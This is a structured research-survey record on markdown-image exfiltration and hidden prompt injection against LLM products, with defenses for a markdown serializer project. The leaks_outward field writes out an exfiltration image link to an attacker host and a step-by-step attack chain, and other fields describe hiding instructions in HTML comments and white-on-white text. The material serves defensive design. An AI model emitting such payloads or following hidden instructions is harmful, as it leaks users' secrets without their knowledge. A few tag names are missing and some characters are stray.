name: Markdown as an injection vector and escaping policy -- synthesis across the markdown-image-exfiltration attack class (documented against ChatGPT, Bing Chat, Claude.ai, Copilot Chat, Bard, Slack AI, NotebookLM, Vertex AI, AI Studio, Colab, Discord, Amazon Q, Writer.com, Google Jules since 2023), the 'hidden-comment injection' skill-poisoning class (arXiv:2602.10498), 'Decoding Latent Attack Surfaces in LLMs: Prompt Injection via HTML in Web Summarization' (arXiv:2509.05831), and 'Structural Role Injection in Handlebars-Templated LLM Prompts' (arXiv:2606.18120) on the limits of escaping/auto-escaping as a defense.
kind: A vulnerability class + defense-pattern literature, not a single tool or standard -- directly load-bearing for this project's `roundtrip_safety` and `adversarial_exposure` fields since the project itself serializes DOM content to markdown as its representation.
maturity: The markdown-image-exfiltration pattern is mature and well-documented (first public report ~April 2023 against ChatGPT plugins, recurring across at least 12 named products/incidents through 2025 per Wraith's catalogue). The escaping-limits research (Handlebars structural-role-injection paper) and hidden-comment-injection research are newer (2026) academic formalizations of the same underlying problem: text-level defenses operate at the wrong abstraction layer for structural/templated injection.
license: Not applicable -- this is a vulnerability class and a body of research/vendor disclosures, not licensed software.
keeps_and_discards: Not an extractor. The relevant KEEP/DISCARD question is what a markdown SERIALIZER preserves that becomes exploitable: markdown image syntax `![alt](url)`, autolinks, and any renderer-honored HTML passthrough (many markdown renderers permit raw HTML) all survive naive HTML-to-markdown conversion and remain independently exploitable in the markdown form -- i.e. converting HTML to markdown does NOT itself neutralize the image-exfiltration or hidden-instruction vectors unless the serializer deliberately drops or rewrites them.
structure_preserved: The attack class exploits exactly the structural elements a faithful serializer is designed to PRESERVE: image references, links, HTML comments (if passed through), and any raw-HTML-in-markdown escape hatch. The Handlebars-injection paper's core finding is structurally important beyond code templating: escaping defends CONTENT (character-level entities: angle brackets, quotes, ampersands) but not STRUCTURE (competing delimiter/template syntax that gets interpreted as a role/instruction boundary rather than data) -- directly analogous to a markdown document where injected `##`/`>` /code-fence syntax could be interpreted by a downstream renderer or LLM as structural signal rather than inert text, if the serializer's own escaping only handles HTML entities and not markdown's own structural tokens.
interactive_elements: The hidden-comment-injection research (arXiv:2602.10498) is directly relevant: instructions can hide in white-on-white text, HTML comments, or markdown that renders cleanly to a human but is read plainly by a model -- none of this requires an actually INTERACTIVE element, just content the human reviewer's rendering path suppresses while the model's raw-text path does not. This is a distinct exposure surface from WAREX's interactive popup-click vulnerability (item 4): here the injection is invisible-by-rendering rather than visible-but-deceptive.
interactive_state_fidelity: Not directly relevant -- the attack class concerns content visibility/interpretation, not control state.
layout_awareness: Central and load-bearing for this project's own no_layout_in_the_fold constraint: white-on-white text and other CSS-concealed content is a LAYOUT-DEPENDENT concealment technique (invisible to a human because of styling, not because of DOM absence) -- meaning a layout-blind fold, by design, CANNOT distinguish concealed-by-CSS injected text from ordinary visible text, and will faithfully preserve it either way. This is exactly the gap the project's own fifth open_question names: 'the fold reads no layout, so it cannot filter the dominant class of concealed injected content.' This item's evidence base is the direct empirical confirmation that this concealment technique is real, documented, and actively exploited (not hypothetical).
javascript_required: Not required for the injection itself (static HTML comments, alt text, and CSS-hidden text all work without script execution), though the EXFILTRATION step for the markdown-image variant requires only that a RENDERER (not necessarily the attacker's own script) auto-fetches the image URL -- i.e. the victim's own markdown-to-HTML rendering step is the mechanism, not JavaScript on the original page.
evaluation_method: Mixed: the markdown-image-exfiltration class is evidenced primarily via documented real-world disclosures/incident reports (not a controlled benchmark) across at least 12 named products. The Handlebars structural-injection paper uses controlled attack-success-rate experiments across multiple LLM models (GPT-3.5, GPT-4o Mini, Claude Haiku, Llama variants) with and without escaping. The hidden-comment-injection paper demonstrates the attack via a controlled Skill-poisoning experiment showing shifted LLM behavior toward proposing sensitive actions.
corpus_size_and_origins: Markdown-image-exfiltration: not a fixed corpus -- a running catalogue of real-world incidents/disclosures spanning ChatGPT (April 2023), Bing Chat, Claude.ai (2024-2025), Microsoft Copilot for M365 (2024), GitHub Copilot Chat (2024), Slack AI (2024), Google Bard, Google Vertex AI, NotebookLM, AI Studio, Colab, Discord, Amazon Q, Writer.com, and Google Jules -- a wide, cross-vendor real-world sample rather than a controlled test set, reported primarily by independent security researchers (Simon Willison, Embrace The Red / Johann Rehberger) rather than the vendors themselves. Handlebars paper: multiple LLM models tested, exact prompt-count/template-count not confirmed from available (corrupted-PDF) sources. Hidden-comment-injection paper: a controlled Skill-poisoning setup, exact scale not confirmed.
reported_precision_recall: Not a precision/recall-style benchmark for the exfiltration class -- it is evidenced by proof-of-concept demonstrations across products, each independently confirmed to be exploitable rather than measured on a shared numeric scale. The escaping-limits paper's stated general finding (not a single number, from available search-summary text): 'escaping lowers attack success rates only for families whose tokens it neutralises, and only where the model is below ceiling' -- i.e. escaping has a PARTIAL, token-family-specific effect, not a uniform reduction, and provides NO benefit once a model is already near-100%-susceptible ('at ceiling') to a given attack family regardless of escaping.
independent_oracle: The exfiltration class's oracle is the strongest possible: an actual HTTP request landing in an attacker-controlled access log is unambiguous, unfalsifiable proof of exploitation -- not a fuzzy text-similarity judgment. This makes markdown-image exfiltration one of the most CLEANLY verifiable vulnerability classes in the entire injection literature, in sharp contrast to prompt-injection-success metrics elsewhere that rely on judge-model scoring.
evidence_independence: Predominantly independent security-researcher disclosures (Simon Willison, Embrace The Red/Johann Rehberger, various named bug-bounty-style write-ups) rather than vendor-self-reported -- vendors' own response has typically been reactive (disabling markdown image rendering from untrusted domains after disclosure) rather than proactive measurement. The two academic papers (Handlebars structural injection, hidden-comment injection) are independent academic research, not vendor-produced.
page_archetype_coverage: Not applicable -- this is a cross-cutting vulnerability class, not a page-type-stratified evaluation.
script_and_locale_behaviour: Not addressed in available sources -- no confirmed discussion of whether the attack class or escaping defenses behave differently across scripts/locales (e.g. whether Unicode-based obfuscation compounds the markdown-injection risk is covered by the separate Unicode-sanitization item in this research set, not this one).
leaks_outward: This field is the entire subject: markdown image syntax `![alt](https://attacker.com/log?data=SECRET)` rendered by the VIEWER's own client causes an automatic, zero-click HTTP GET to the attacker's server carrying exfiltrated data (system prompts, conversation history, tool outputs, or any other in-context secret) encoded in the URL, typically base64-encoded as a subdomain or query parameter. The attack chain (per Wraith's five-step breakdown, directly transferable): (1) agent has readable context with secrets, (2) attacker-controlled text reaches that context via direct input, indirect sources (web pages, emails, RAG chunks), or tool feedback, (3) the model EMITS the malicious markdown image syntax, (4) the rendering UI converts markdown to an HTML `` tag with NO validation, (5) the browser auto-fetches the image, completing exfiltration with zero user interaction. Attack variants extend beyond images to CSS `background-image`, ``, `` prefetch, hyperlink autopreview fetches, iframes, and video elements -- any URL-fetching markup construct is a candidate exfiltration channel.
mechanism_detectability: Not the attack's own concern (it is invisible by design to the human user: 'the damage is the side effect of rendering,' the user sees nothing wrong), but directly relevant to this project's OWN mechanism_detectability field in a mirror-image sense: a defender wanting to detect that exfiltration occurred would need to monitor outbound requests generated by markdown rendering, which is exactly the kind of network-egress monitoring this project's own leaks_outward commitments should apply to its own rendering paths if it ever renders markdown back to a live view.
countermeasures: Four documented defensive patterns, ranked by the source material's own assessed reliability: (1) SERVER-SIDE IMAGE PROXY WITH ALLOWLIST -- the most production-tested defense; rewrite all image URLs to point at a proxy that validates against an allowlist and strips query strings before fetching (source's own caveat: 'a proxy that fetches anything is the same channel with extra steps,' i.e. the proxy itself must enforce the allowlist, not just relay); (2) CONTENT SECURITY POLICY (CSP) with a strict `img-src` allowlist (or `img-src 'self'` if images are already proxied) -- explicitly positioned as defense-in-depth ('belt to the proxy's suspenders'), not a substitute, because CSP 'can fail silently when misconfigured and rules are easy to undo accidentally during frontend refactors'; (3) MARKDOWN SANITIZATION -- validating image URLs at render time (rejecting cross-origin hosts, query strings, data URIs, suspicious patterns), explicitly flagged as historically buggy and secondary to the proxy; (4) DISABLE RICH RENDERING entirely -- render output as plain text or a markdown subset excluding images/links, described as 'unfashionable but most reliable for high-risk contexts.' The standard INDUSTRY mitigation actually adopted post-disclosure across most named products has simply been (4)-adjacent: dropping support for embedding images in markdown from untrusted domains.
measured_fidelity_cost: The Handlebars paper's key MEASURED finding functions as a fidelity-cost result for escaping specifically: escaping reduces attack success ONLY for the HTML-vulnerable token families it targets (angle brackets, quotes, ampersands) and provides NO measurable benefit against delimiter/structural-syntax families, and no benefit at all once a model is already at-ceiling susceptibility for a given family -- i.e. the 'cost' of relying on escaping alone is a FALSE sense of security for exactly the attack families (structural/template-syntax injection) that matter most for a markdown-emitting pipeline, since markdown's OWN syntax (headers, blockquotes, code fences, link/image brackets) is structurally analogous to the delimiter-family attacks the paper found escaping ineffective against.
gate_state_at_capture: Not directly addressed, though relevant by extension: exfiltration payloads are commonly seeded via 'indirect sources (web pages, emails, RAG indices)' per the attack-chain breakdown -- meaning any page this project captures (gated or ungated) could carry such a payload, and gate state alone provides no protection since the injection travels as ordinary page content, not as a gate-bypass technique.
determinism: Not directly addressed by the exfiltration-class sources, though the underlying mechanism (a markdown renderer converting `![alt](url)` to an `` tag, and a browser auto-fetching it) is deterministic given fixed input and a fixed renderer -- the LLM's decision to EMIT the malicious markdown in the first place is the non-deterministic step, governed by whatever prompt-injection susceptibility the model has for the specific attack family (per the Handlebars paper's ceiling/non-ceiling framing).
determinism_across_versions: Not directly addressed, though implicitly significant: successive model/product versions across the 12+ named incidents show the SAME vulnerability recurring across different vendors and different times (2023-2025), suggesting the underlying weakness (rich markdown rendering of untrusted content without an allowlist) is not something that 'gets fixed by a new model version' -- it requires an explicit architectural/rendering-boundary fix, not reliance on model improvement.
reproducibility: High -- the attack is trivially reproducible given any markdown-rendering surface that (a) renders images from arbitrary domains and (b) has untrusted content in its context; this is precisely why it recurs across so many independently-built products rather than being a one-off.
failure_modes: The core failure mode, stated plainly in the source material and directly load-bearing for this project: 'there's no reliable way to escape user input or isolate intent -- especially when the injection is buried inside a long message, a document, or a retrieved context chunk.' A second, distinct failure mode from the hidden-comment-injection research: content invisible to a HUMAN reviewer (HTML comments rendered away, white-on-white CSS text) remains fully visible to the MODEL if the raw text is passed through -- meaning any human-in-the-loop review step that inspects only the RENDERED output, not the raw serialized text, provides a false sense of safety.
failure_visibility: This is the attack class's defining property and its greatest danger: it fails SILENTLY by design. The user/victim sees a normal-looking response; the only observable trace is server-side, on the ATTACKER's infrastructure (the access log entry), not anywhere the victim or defender would naturally look. This is the sharpest possible counter-example to this project's own failure_visibility commitment -- a system that renders markdown images from arbitrary domains is, by construction, a silent-failure architecture regardless of how loud its OTHER failure modes are.
scale_limits: Not applicable -- this is a per-instance vulnerability, not a scale-dependent cost model.
delta_cost_model: Not applicable -- no incremental-update concept in this vulnerability class.
adversarial_exposure: This entire item IS the adversarial_exposure field's central concern for a markdown-emitting serializer: (1) invisible-to-human-but-visible-to-model content (white-on-white text, suppressed HTML comments) surviving a layout-blind fold, matching the project's own named open question; (2) markdown's own image/link syntax becoming an active zero-click exfiltration channel if the project's output is ever consumed by a rich-markdown-rendering surface (its own or a downstream agent's); (3) escaping being a CHARACTER-level defense that structurally cannot stop DELIMITER/structural-syntax attacks, meaning HTML-entity-escaping the DOM text alone is insufficient once that text is re-serialized into markdown's own structurally-significant syntax (headers, links, images, code fences) -- a markdown-specific escaping policy must additionally neutralize or quote MARKDOWN's own structural tokens when they appear in what should be inert captured text, not just HTML's.
provenance_carrying: Directly relevant as a candidate defense not explored in the source material but implied by this project's own architecture: since exfiltration payloads typically arrive via 'indirect sources (web pages, emails, RAG indices),' per-token provenance (this text came from URL X, xpath Y, capture time Z) would let a downstream consumer apply different trust levels to captured-page content versus the system's own instructions -- exactly the provenance-tagging-defense pattern covered in the adjacent IPIGuard/CausalArmor/Parallax item (item 8).
roundtrip_safety: Directly relevant: this project's own roundtrip_safety field (serialize->parse->serialize as a fixed point, doubling as an injection-hardening metric) is exactly the right lens for markdown-image and structural-injection risks -- a markdown ESCAPING policy that correctly neutralizes image/link/header/code-fence syntax appearing in captured TEXT (as opposed to captured text that is legitimately meant to become such syntax) should be independently testable via round-trip: escaped captured text, re-parsed, should produce the SAME inert text back, never an active image/link. A naive escaping policy that fails this round-trip check (e.g. producing a still-live `![...]​(...)` construct after 'escaping') is empirically distinguishable from a correct one using exactly the fixed-point check this project already values for other reasons.
token_budget_and_ordering: Not directly addressed, though relevant by extension: the hidden-comment-injection research's finding that injected content shifts LLM behavior even when 'the user's request is benign' suggests injected content's EFFECT is not simply proportional to its token share of context -- a small, well-placed injected comment can have outsized behavioral effect regardless of where it falls in truncation order, which is a distinct risk from the ordinary recency-bias concern covered by the separate context-rot item.
representation_cost: Not directly addressed -- the vulnerability class is orthogonal to token-efficiency concerns.
what_could_be_adopted: Three concrete, specific mechanisms: (1) a MARKDOWN-SPECIFIC escaping policy that goes beyond HTML-entity escaping to also neutralize markdown's own structurally-significant tokens (leading `#`, `>`, code fences, and critically the `![...](...)ā` / `[...](...)` image-and-link constructs) when they occur in text captured FROM a page's content rather than intentionally emitted by the serializer's own structure -- directly informed by the Handlebars paper's finding that character-level escaping alone does not stop delimiter/structural attacks; (2) NEVER render captured markdown through a rich-rendering surface (image loading, autolink-preview) that fetches arbitrary URLs without going through an allowlisting proxy first -- adopting pattern (1) from the countermeasures list (server-side proxy + allowlist) as the primary defense and CSP `img-src` as defense-in-depth, if this project's output is ever rendered back to a human or agent view; (3) use the round-trip fixed-point check (serialize->parse->serialize) specifically as an ESCAPING-CORRECTNESS test, verifying that captured text containing markdown-structural-looking substrings survives escaping and re-parsing as INERT text rather than becoming live syntax -- directly reusing the oracle-free roundtrip methodology from item 3.
constraint_violation_ledger: structure_agnosticism: ADOPTABLE AS-IS -- markdown-structural escaping is a syntax-neutralization concern, not a region-classification concern; it requires no naming of nav/article/result regions. no_layout_in_the_fold: NEGATIVE ORACLE ONLY, AND THE SHARPEST FINDING IN THIS ITEM -- white-on-white/CSS-concealed text is EXACTLY the content a layout-blind fold cannot filter, confirmed here as a real, actively-exploited technique rather than a hypothetical; this item does not resolve the project's own open question but firmly establishes its stakes are real. o_delta: NOT APPLICABLE -- escaping is a per-token/per-document transform, not an incremental-update concept; it can and should be applied within whatever O(delta) pipeline already exists without changing that pipeline's asymptotic behavior. no_mocks: ADOPTABLE AS-IS -- testing escaping correctness against REAL markdown parsers/renderers (not a stub renderer) is directly no-mocks-compliant, and is in fact NECESSARY given the source material's finding that markdown sanitizer logic has 'historically been buggy' -- only real-renderer round-trip testing would catch such bugs. closed_shadow_roots_stay_closed: NOT APPLICABLE -- orthogonal to shadow-DOM capture policy, though a closed shadow root could theoretically be used to HIDE an injection payload from casual inspection while the sensor (correctly) reports it as unreachable rather than silently capturing or silently dropping it, which is aligned behavior. OVERALL VERDICT: adoptable as-is at the escaping-POLICY and round-trip-TESTING level (concrete, implementable, well-evidenced); the layout-blind concealment gap this item confirms is real remains an OPEN, unresolved project risk that this research does not close -- it sharpens the problem statement rather than solving it, which is itself the correct and honest outcome for this item.
governance_signal_handling: Not addressed -- orthogonal to this vulnerability class.
legal_basis_and_pii_posture: Directly relevant in one specific way: since the exfiltration payload's DATA (the SECRET being exfiltrated) is often the very content this project would be retaining as captured page/context data, any retained corpus containing successfully-exfiltrated (or exfiltration-attempting) content would itself need the same PII/lawful-basis review as any other retained content -- not a new category, but a reminder that adversarial content is not exempt from the project's general retention posture.
uncertain: Exact attack-success-rate numbers (percentages) from the Handlebars structural-injection paper's per-model, per-escaping-mechanism experiments could not be extracted -- PDF text extraction failed (corrupted/compressed stream); only the qualitative findings (token-family-specific effect, ceiling effect) were confirmed via search-summary text
Exact scale (number of poisoned Skills / trials) of the hidden-comment-injection paper's experiment was not confirmed

Whether any of the 12+ named incident products have published their OWN post-fix measured reduction in exploitability (as opposed to simply disabling the feature) was not confirmed from available sources

This item's evidence is a synthesis across independent security-researcher disclosures rather than one peer-reviewed corpus with a single denominator -- treat the 12+ product count as an approximate, evolving tally (per Wraith's own catalogue, itself likely incomplete) rather than an exhaustive census
